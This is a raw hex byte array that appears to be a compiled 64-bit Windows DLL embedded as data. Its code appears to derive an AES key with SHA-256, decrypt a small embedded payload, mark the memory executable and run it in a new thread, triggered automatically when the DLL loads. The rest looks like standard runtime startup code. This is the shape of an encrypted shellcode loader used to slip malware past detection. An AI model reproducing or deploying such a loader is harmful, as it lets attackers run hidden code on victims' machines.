0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x58, 0xc7, 0x44, 0x24, 0x20, 0x0, 0x0, 0x0, 0xf0, 0x41, 0xb9, 0x18, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xff, 0x15, 0xcb, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xa, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xe9, 0xd8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xba, 0xc, 0x80, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xff, 0x15, 0xc5, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xa, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xe9, 0xaa, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x44, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x8b, 0x54, 0x24, 0x70, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xff, 0x15, 0xa7, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xa, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xe9, 0x84, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x4c, 0x8b, 0x44, 0x24, 0x38, 0xba, 0x10, 0x66, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xff, 0x15, 0x57, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x7, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xeb, 0x57, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x15, 0x35, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x7, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xeb, 0x25, 0x33, 0xd2, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xff, 0x15, 0x5, 0xdf, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xff, 0x15, 0x2a, 0xdf, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x15, 0xff, 0xde, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x58, 0xc7, 0x44, 0x24, 0x34, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x30, 0x20, 0x1, 0x0, 0x0, 0x8b, 0x44, 0x24, 0x30, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x41, 0xb8, 0x0, 0x30, 0x0, 0x0, 0x8b, 0xd0, 0x33, 0xc9, 0xff, 0x15, 0xfa, 0xde, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x40, 0x41, 0xb9, 0x10, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0xb0, 0x7f, 0x1, 0x0, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x8d, 0xd, 0x85, 0x7e, 0x1, 0x0, 0xe8, 0x80, 0xfe, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x30, 0x44, 0x8b, 0xc0, 0x48, 0x8d, 0x15, 0x72, 0x7e, 0x1, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xe8, 0xf8, 0xb, 0x0, 0x0, 0x8b, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x34, 0x41, 0xb8, 0x20, 0x0, 0x0, 0x0, 0x8b, 0xd0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x15, 0xac, 0xde, 0x0, 0x0, 0x89, 0x44, 0x24, 0x38, 0x83, 0x7c, 0x24, 0x38, 0x0, 0x74, 0x38, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x20, 0x0, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x4c, 0x8b, 0x44, 0x24, 0x40, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x15, 0x6e, 0xde, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x48, 0xba, 0xff, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0xff, 0x15, 0x51, 0xde, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x38, 0x8b, 0x44, 0x24, 0x48, 0x89, 0x44, 0x24, 0x20, 0x83, 0x7c, 0x24, 0x20, 0x1, 0x74, 0x2, 0xeb, 0x5, 0xe8, 0xf8, 0xfe, 0xff, 0xff, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x85, 0xd2, 0x74, 0x39, 0x83, 0xea, 0x1, 0x74, 0x28, 0x83, 0xea, 0x1, 0x74, 0x16, 0x83, 0xfa, 0x1, 0x74, 0xa, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xe8, 0xde, 0x4, 0x0, 0x0, 0xeb, 0x5, 0xe8, 0xaf, 0x4, 0x0, 0x0, 0xf, 0xb6, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x49, 0x8b, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xf, 0x0, 0x0, 0x0, 0x4d, 0x85, 0xc0, 0xf, 0x95, 0xc1, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0x18, 0x1, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x4c, 0x8b, 0xf1, 0x33, 0xc9, 0xe8, 0x4e, 0x5, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x84, 0xc8, 0x0, 0x0, 0x0, 0xe8, 0xd5, 0x3, 0x0, 0x0, 0x8a, 0xd8, 0x88, 0x44, 0x24, 0x40, 0x40, 0xb7, 0x1, 0x83, 0x3d, 0xed, 0x88, 0x1, 0x0, 0x0, 0xf, 0x85, 0xc5, 0x0, 0x0, 0x0, 0xc7, 0x5, 0xdd, 0x88, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x20, 0x4, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x4f, 0xe8, 0x2f, 0x8, 0x0, 0x0, 0xe8, 0x5a, 0x3, 0x0, 0x0, 0xe8, 0x81, 0x3, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x6, 0xe0, 0x0, 0x0, 0x48, 0x8d, 0xd, 0xdf, 0xdf, 0x0, 0x0, 0xe8, 0xd6, 0x3a, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x29, 0xe8, 0xbd, 0x3, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x20, 0x48, 0x8d, 0x15, 0xbe, 0xdf, 0x0, 0x0, 0x48, 0x8d, 0xd, 0xaf, 0xdf, 0x0, 0x0, 0xe8, 0x72, 0x3a, 0x0, 0x0, 0xc7, 0x5, 0x88, 0x88, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x40, 0x32, 0xff, 0x8a, 0xcb, 0xe8, 0x32, 0x6, 0x0, 0x0, 0x40, 0x84, 0xff, 0x75, 0x3f, 0xe8, 0x78, 0x6, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x83, 0x38, 0x0, 0x74, 0x24, 0x48, 0x8b, 0xc8, 0xe8, 0x7f, 0x5, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x18, 0x4c, 0x8b, 0xc6, 0xba, 0x2, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xce, 0x48, 0x8b, 0x3, 0x4c, 0x8b, 0xd, 0x4a, 0xdf, 0x0, 0x0, 0x41, 0xff, 0xd1, 0xff, 0x5, 0x11, 0x88, 0x1, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x2c, 0x6, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x30, 0x40, 0x8a, 0xf9, 0x8b, 0x5, 0xd1, 0x87, 0x1, 0x0, 0x85, 0xc0, 0x7f, 0xd, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xff, 0xc8, 0x89, 0x5, 0xb8, 0x87, 0x1, 0x0, 0xe8, 0xbb, 0x2, 0x0, 0x0, 0x8a, 0xd8, 0x88, 0x44, 0x24, 0x20, 0x83, 0x3d, 0xd6, 0x87, 0x1, 0x0, 0x2, 0x75, 0x37, 0xe8, 0xcf, 0x3, 0x0, 0x0, 0xe8, 0x6a, 0x2, 0x0, 0x0, 0xe8, 0x61, 0x7, 0x0, 0x0, 0x83, 0x25, 0xbe, 0x87, 0x1, 0x0, 0x0, 0x8a, 0xcb, 0xe8, 0x6b, 0x5, 0x0, 0x0, 0x33, 0xd2, 0x40, 0x8a, 0xcf, 0xe8, 0x85, 0x5, 0x0, 0x0, 0xf6, 0xd8, 0x1b, 0xdb, 0x83, 0xe3, 0x1, 0xe8, 0xd1, 0x3, 0x0, 0x0, 0x8b, 0xc3, 0xeb, 0xa2, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0xa7, 0x5, 0x0, 0x0, 0x90, 0x90, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x8, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0xf0, 0x8b, 0xfa, 0x4c, 0x8b, 0xf1, 0x85, 0xd2, 0x75, 0xf, 0x39, 0x15, 0x34, 0x87, 0x1, 0x0, 0x7f, 0x7, 0x33, 0xc0, 0xe9, 0xee, 0x0, 0x0, 0x0, 0x8d, 0x42, 0xff, 0x83, 0xf8, 0x1, 0x77, 0x45, 0x48, 0x8b, 0x5, 0xdc, 0xde, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0xa, 0xc7, 0x44, 0x24, 0x30, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x14, 0xff, 0x15, 0x37, 0xde, 0x0, 0x0, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xc0, 0xf, 0x84, 0xb2, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xe8, 0xa0, 0xfd, 0xff, 0xff, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xc0, 0xf, 0x84, 0x97, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xe8, 0x51, 0xfd, 0xff, 0xff, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x83, 0xff, 0x1, 0x75, 0x36, 0x85, 0xc0, 0x75, 0x32, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0xe8, 0x35, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xf6, 0xf, 0x95, 0xc1, 0xe8, 0xc6, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x5, 0x63, 0xde, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xe, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0xff, 0x15, 0xc0, 0xdd, 0x0, 0x0, 0x85, 0xff, 0x74, 0x5, 0x83, 0xff, 0x3, 0x75, 0x40, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xe8, 0x2e, 0xfd, 0xff, 0xff, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xc0, 0x74, 0x29, 0x48, 0x8b, 0x5, 0x29, 0xde, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x8d, 0x58, 0x1, 0x89, 0x5c, 0x24, 0x30, 0xeb, 0x14, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xff, 0x15, 0x7d, 0xdd, 0x0, 0x0, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0xeb, 0x6, 0x33, 0xdb, 0x89, 0x5c, 0x24, 0x30, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf8, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x83, 0xfa, 0x1, 0x75, 0x5, 0xe8, 0x1f, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc7, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xe9, 0x8f, 0xfe, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x5, 0x88, 0x7b, 0x1, 0x0, 0x48, 0xbb, 0x32, 0xa2, 0xdf, 0x2d, 0x99, 0x2b, 0x0, 0x0, 0x48, 0x3b, 0xc3, 0x75, 0x74, 0x48, 0x83, 0x65, 0x18, 0x0, 0x48, 0x8d, 0x4d, 0x18, 0xff, 0x15, 0xaa, 0xda, 0x0, 0x0, 0x48, 0x8b, 0x45, 0x18, 0x48, 0x89, 0x45, 0x10, 0xff, 0x15, 0x94, 0xda, 0x0, 0x0, 0x8b, 0xc0, 0x48, 0x31, 0x45, 0x10, 0xff, 0x15, 0x80, 0xda, 0x0, 0x0, 0x8b, 0xc0, 0x48, 0x8d, 0x4d, 0x20, 0x48, 0x31, 0x45, 0x10, 0xff, 0x15, 0x68, 0xda, 0x0, 0x0, 0x8b, 0x45, 0x20, 0x48, 0x8d, 0x4d, 0x10, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x33, 0x45, 0x20, 0x48, 0x33, 0x45, 0x10, 0x48, 0x33, 0xc1, 0x48, 0xb9, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x48, 0x23, 0xc1, 0x48, 0xb9, 0x33, 0xa2, 0xdf, 0x2d, 0x99, 0x2b, 0x0, 0x0, 0x48, 0x3b, 0xc3, 0x48, 0xf, 0x44, 0xc1, 0x48, 0x89, 0x5, 0x5, 0x7b, 0x1, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0xf7, 0xd0, 0x48, 0x89, 0x5, 0xee, 0x7a, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0x48, 0x8d, 0xd, 0x49, 0x85, 0x1, 0x0, 0x48, 0xff, 0x25, 0x2a, 0xda, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x8d, 0xd, 0x39, 0x85, 0x1, 0x0, 0xe9, 0xd0, 0xf, 0x0, 0x0, 0x48, 0x8d, 0x5, 0x3d, 0x85, 0x1, 0x0, 0xc3, 0x48, 0x8d, 0x5, 0x3d, 0x85, 0x1, 0x0, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xe7, 0xff, 0xff, 0xff, 0x48, 0x83, 0x8, 0x24, 0xe8, 0xe6, 0xff, 0xff, 0xff, 0x48, 0x83, 0x8, 0x2, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xa7, 0x6, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x21, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x30, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x48, 0x8, 0xeb, 0x5, 0x48, 0x3b, 0xc8, 0x74, 0x14, 0x33, 0xc0, 0xf0, 0x48, 0xf, 0xb1, 0xd, 0x4, 0x85, 0x1, 0x0, 0x75, 0xee, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xb0, 0x1, 0xeb, 0xf7, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x6b, 0x6, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xe8, 0xb6, 0x4, 0x0, 0x0, 0xeb, 0x19, 0xe8, 0x53, 0x6, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0xbc, 0x3d, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x4, 0x32, 0xc0, 0xeb, 0x7, 0xe8, 0x7b, 0x41, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x33, 0xc9, 0xe8, 0x3d, 0x1, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x67, 0xf, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x12, 0xe8, 0x5a, 0x44, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x7, 0xe8, 0x65, 0xf, 0x0, 0x0, 0xeb, 0xec, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x53, 0x44, 0x0, 0x0, 0xe8, 0x4e, 0xf, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xf0, 0x8b, 0xda, 0x48, 0x8b, 0xe9, 0xe8, 0xc4, 0x5, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x16, 0x83, 0xfb, 0x1, 0x75, 0x11, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x48, 0x8b, 0xcd, 0x48, 0x8b, 0xc7, 0xff, 0x15, 0x22, 0xdb, 0x0, 0x0, 0x48, 0x8b, 0x54, 0x24, 0x58, 0x8b, 0x4c, 0x24, 0x50, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xe9, 0x6c, 0x36, 0x0, 0x0, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x7f, 0x5, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x10, 0x48, 0x8d, 0xd, 0x4, 0x84, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0x3, 0x42, 0x0, 0x0, 0xe8, 0xa6, 0x3a, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5, 0xe8, 0x81, 0x3a, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x33, 0xc9, 0xe8, 0xf1, 0x43, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xd0, 0xe, 0x0, 0x0, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xf, 0xb6, 0x5, 0xbf, 0x83, 0x1, 0x0, 0x85, 0xc9, 0xbb, 0x1, 0x0, 0x0, 0x0, 0xf, 0x44, 0xc3, 0x88, 0x5, 0xaf, 0x83, 0x1, 0x0, 0xe8, 0x76, 0x3, 0x0, 0x0, 0xe8, 0x3d, 0xe, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x14, 0xe8, 0x44, 0x43, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x9, 0x33, 0xc9, 0xe8, 0x75, 0xe, 0x0, 0x0, 0xeb, 0xea, 0x8a, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x80, 0x3d, 0x74, 0x83, 0x1, 0x0, 0x0, 0x8b, 0xd9, 0x75, 0x67, 0x83, 0xf9, 0x1, 0x77, 0x6a, 0xe8, 0xdd, 0x4, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x28, 0x85, 0xdb, 0x75, 0x24, 0x48, 0x8d, 0xd, 0x5e, 0x83, 0x1, 0x0, 0xe8, 0xa5, 0x41, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x10, 0x48, 0x8d, 0xd, 0x66, 0x83, 0x1, 0x0, 0xe8, 0x95, 0x41, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x2e, 0x32, 0xc0, 0xeb, 0x33, 0x66, 0xf, 0x6f, 0x5, 0xc1, 0xda, 0x0, 0x0, 0x48, 0x83, 0xc8, 0xff, 0xf3, 0xf, 0x7f, 0x5, 0x2d, 0x83, 0x1, 0x0, 0x48, 0x89, 0x5, 0x36, 0x83, 0x1, 0x0, 0xf3, 0xf, 0x7f, 0x5, 0x36, 0x83, 0x1, 0x0, 0x48, 0x89, 0x5, 0x3f, 0x83, 0x1, 0x0, 0xc6, 0x5, 0x9, 0x83, 0x1, 0x0, 0x1, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xe8, 0xfa, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x18, 0x4c, 0x8b, 0xc1, 0xb8, 0x4d, 0x5a, 0x0, 0x0, 0x66, 0x39, 0x5, 0x11, 0xe7, 0xff, 0xff, 0x75, 0x78, 0x48, 0x63, 0xd, 0x44, 0xe7, 0xff, 0xff, 0x48, 0x8d, 0x15, 0x1, 0xe7, 0xff, 0xff, 0x48, 0x3, 0xca, 0x81, 0x39, 0x50, 0x45, 0x0, 0x0, 0x75, 0x5f, 0xb8, 0xb, 0x2, 0x0, 0x0, 0x66, 0x39, 0x41, 0x18, 0x75, 0x54, 0x4c, 0x2b, 0xc2, 0xf, 0xb7, 0x41, 0x14, 0x48, 0x8d, 0x51, 0x18, 0x48, 0x3, 0xd0, 0xf, 0xb7, 0x41, 0x6, 0x48, 0x8d, 0xc, 0x80, 0x4c, 0x8d, 0xc, 0xca, 0x48, 0x89, 0x14, 0x24, 0x49, 0x3b, 0xd1, 0x74, 0x18, 0x8b, 0x4a, 0xc, 0x4c, 0x3b, 0xc1, 0x72, 0xa, 0x8b, 0x42, 0x8, 0x3, 0xc1, 0x4c, 0x3b, 0xc0, 0x72, 0x8, 0x48, 0x83, 0xc2, 0x28, 0xeb, 0xdf, 0x33, 0xd2, 0x48, 0x85, 0xd2, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x14, 0x83, 0x7a, 0x24, 0x0, 0x7d, 0x4, 0x32, 0xc0, 0xeb, 0xa, 0xb0, 0x1, 0xeb, 0x6, 0x32, 0xc0, 0xeb, 0x2, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x18, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8a, 0xd9, 0xe8, 0xc7, 0x3, 0x0, 0x0, 0x33, 0xd2, 0x85, 0xc0, 0x74, 0xb, 0x84, 0xdb, 0x75, 0x7, 0x48, 0x87, 0x15, 0x36, 0x82, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x80, 0x3d, 0x2b, 0x82, 0x1, 0x0, 0x0, 0x8a, 0xd9, 0x74, 0x4, 0x84, 0xd2, 0x75, 0xc, 0xe8, 0x2, 0x42, 0x0, 0x0, 0x8a, 0xcb, 0xe8, 0xff, 0xc, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8d, 0x5, 0x6d, 0x93, 0x1, 0x0, 0xc3, 0x83, 0x25, 0x35, 0x82, 0x1, 0x0, 0x0, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x40, 0xfb, 0xff, 0xff, 0x48, 0x81, 0xec, 0xc0, 0x5, 0x0, 0x0, 0x8b, 0xd9, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xd2, 0xd6, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x4, 0x8b, 0xcb, 0xcd, 0x29, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0xc4, 0xff, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x4d, 0xf0, 0x41, 0xb8, 0xd0, 0x4, 0x0, 0x0, 0xe8, 0x37, 0xe, 0x0, 0x0, 0x48, 0x8d, 0x4d, 0xf0, 0xff, 0x15, 0x6d, 0xd6, 0x0, 0x0, 0x48, 0x8b, 0x9d, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x95, 0xd8, 0x4, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x5b, 0xd6, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3c, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x8d, 0xe0, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x95, 0xd8, 0x4, 0x0, 0x0, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0xc3, 0x48, 0x8d, 0x8d, 0xe8, 0x4, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8d, 0x4d, 0xf0, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x33, 0xc9, 0xff, 0x15, 0x22, 0xd6, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xc8, 0x4, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x85, 0xe8, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x48, 0x8d, 0x85, 0xc8, 0x4, 0x0, 0x0, 0x41, 0xb8, 0x98, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x89, 0x85, 0x88, 0x0, 